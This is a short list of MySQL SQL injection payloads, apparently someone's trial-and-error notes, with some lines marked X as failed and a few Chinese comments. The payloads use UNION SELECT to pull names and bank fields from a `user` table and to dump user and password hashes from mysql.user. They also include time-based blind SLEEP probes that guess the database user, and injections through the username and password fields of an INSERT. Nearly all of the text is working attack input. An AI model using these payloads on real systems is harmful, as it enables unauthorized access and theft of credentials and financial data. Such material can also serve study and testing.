test' AND 1=2) UNION SELECT `ID`,`name`,`bank` FROM `user` WHERE ID >20 # 
x   test' AND 1=2) UNION SELECT NULL,`name`,NULL FROM `user` WHERE ID <20 #
test' AND 1=2) UNION SELECT NULL,`name`,`bank` FROM `user` WHERE ID <20 #
X   test' AND 1=2) UNION SELECT NULL,`name`,`bank` WHERE ID <20 #
X   test' AND 1=2) UNION SELECT NULL,`name`,`bank` WHERE ID =33 #
test' AND 1=2) UNION SELECT NULL,`name`,`bank` FROM `user` WHERE ID =33 #
X   test' AND 1=2) UNION SELECT @@version #
X  test') UNION SELECT IF(USER()='connect',SLEEP(5),SLEEP(0) ) #
X   test') UNION SELECT IF(USER()='connect',SLEEP(5),SLEEP(0) ) #
x   test') UNION SELECT IF(USER()='connect' OR 1=1,1,0) # 
test' AND 1=2) UNION SELECT IF(USER()='connect',SLEEP(5),SLEEP(10) ),USER(),@@version #
test' AND 1=2) UNION SELECT IF(substring(USER(),1,3)='con',SLEEP(2),SLEEP(0) ),USER(),@@version #  盲注猜解用户名
test' AND 1=2) UNION SELECT SLEEP(2),USER(),@@version #  只要查询的单位在数量上相同即可，名字不必对应
test' AND 1=2) UNION SELECT NULL,`user`,`password` FROM mysql.user #
test' AND 1=2) UNION SELECT NULL,`name`,`password` FROM `user` WHERE ID =33 #
test' AND 1=2) UNION SELECT SLEEP(2),connection_id(),@@version #
test' AND 1=2) UNION SELECT SLEEP(2),last_insert_id(),@@version #
X     a'+(select @@version)+'a
aadw',(select @@version),2) # 在用户名注入
asdw'),(select @@version)) #  在密码注入，将version放入bank
asdw'),(SUBSTRING(USER(),5,1))) #  bank为0
X     asdw'),(SUBSTRING(SELECT USER()),5,1)) #
X   asdw'),(SELECT USER())) #


